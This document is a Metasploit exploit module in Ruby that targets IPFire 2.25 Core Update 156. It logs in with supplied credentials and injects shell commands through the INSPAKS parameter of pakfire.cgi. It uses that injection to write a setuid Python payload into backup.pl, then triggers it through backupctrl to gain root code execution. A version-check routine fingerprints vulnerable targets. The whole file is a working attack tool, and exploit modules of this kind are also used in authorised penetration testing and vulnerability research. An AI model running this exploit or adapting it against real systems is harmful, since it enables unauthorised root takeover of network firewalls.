##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# oThis explit execute arbitrary code on ipfire 2.25 core update 156
# a bug is blind os command injection
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ipfire 2.25 core 156 remote code execution',
        'Description' => %q{This exploit execute arbitrary code on ipfire 2.25 core 156 as root.},
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Mücahit Saratar <trregen222@gmail.com>', # vulnerability research & exploit development
          ],
        'References' =>
          [
            [ 'OSVDB', '' ],
            [ 'EDB', '49869' ], # copied from exploit-db  https://www.exploit-db.com/exploits/49869
            [ 'URL', 'https://github.com/MucahitSaratar/ipfire-2-25-auth-rce'],
            [ 'URL', 'https://www.youtube.com/watch?v=5FUXV7dfNjg'],
            [ 'CVE', '']
          ],
        'Platform' => ['python'],
        'Privileged' => true,
        'Arch' => ARCH_PYTHON,
        'Targets' =>
          [
            [ 'Automatic Target', {}]
          ],
        'DisclosureDate' => '2021-06-22',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(444),
        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
        OptString.new('ARCH', [ true, 'arch of target machine. arm or x86_64', 'x86_64']),
        OptString.new('PASSWORD', [ false, 'Password to login with', 'hailsatan']) ### sifirla
      ], self.class
    )
  end

  def vpath
    '/cgi-bin/pakfire.cgi' # vulnerable path
  end

  def kullaniciadi
    datastore['USERNAME']
  end

  def parola
    datastore['PASSWORD']
  end

  def paket_gonder(metot, calistir = 'sleep 10', bekle = 20)
    @baslik = {
      'Authorization' => basic_auth(kullaniciadi, parola),
      'Cache-Control' => 'max-age=0',
      'User-Agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
      'Origin' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}",
      'Sec-GPC' => '1',
      'Sec-Fetch-Site' => 'same-origin',
      'Upgrade-Insecure-Requests' => '1',
      'Sec-Fetch-Mode' => 'navigate',
      'Sec-Fetch-User' => '?1',
      'Sec-Fetch-Dest' => 'document',
      'Accept' => '*/*',
      'Referer' => "https://#{datastore['RHOST']}:#{datastore['RPORT']}/",
      'Accept-Encoding' => 'gzip, deflate',
      'Accept-Language' => 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
      'Connection' => 'keep-alive',
      'Content-Type' => 'application/x-www-form-urlencoded'
    }
    if metot == 'GET'
      response = send_request_cgi(
        'uri' => vpath,
        'headers' => @baslik,
        'SSL' => true
      )
    else
      response = send_request_cgi(
        'uri' => vpath,
        'headers' => @baslik,
        'SSL' => true,
        'method' => 'POST',
        'vars_post' => {
          'INSPAKS' => "7zip-edited;#{calistir}",
          'ACTION' => 'install',
          'x' => '7',
          'y' => '10'
        },
        'timeout' => bekle
      )
    end
    return response
  end

  def check
    vprint_status('checking app version')
    cevap = paket_gonder('GET', '', 15)
    @version = cevap.body.scan(/IPFire (.*) \(.*\) - Core Update [0-9]{3}/).flatten[0] || ''
    @arch = cevap.body.scan(/IPFire .* \((.*)\) - Core Update [0-9]{3}/).flatten[0] || ''
    @core = cevap.body.scan(/IPFire .* \(.*\) - Core Update (.*)/).flatten[0] || ''
    datastore['ARCH'] = @arch
    if @core.to_i >= 157
      Exploit::CheckCode::Safe
    else
      vprint_good('Target is vulnerable') if @core.to_i == 156
      Exploit::CheckCode::Appears
    end
  end

  def exploit
    paket_gonder('POST', 'echo "#!/usr/bin/python" > /var/ipfire/backup/bin/backup.pl', 1)
    vprint_status('first attempt done')
    paket_gonder('POST', "echo \"__import__('os').setuid(0)\" >> /var/ipfire/backup/bin/backup.pl", 1)
    vprint_status('setuid triger done')
    paket_gonder('POST', "echo \"#{payload.encoded}\" >> /var/ipfire/backup/bin/backup.pl", 1)
    vprint_status('payload yerlestiriliyor-')
    paket_gonder('POST', '/usr/local/bin/backupctrl', 1)
    vprint_status('payload tetiklendi-')
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end
end
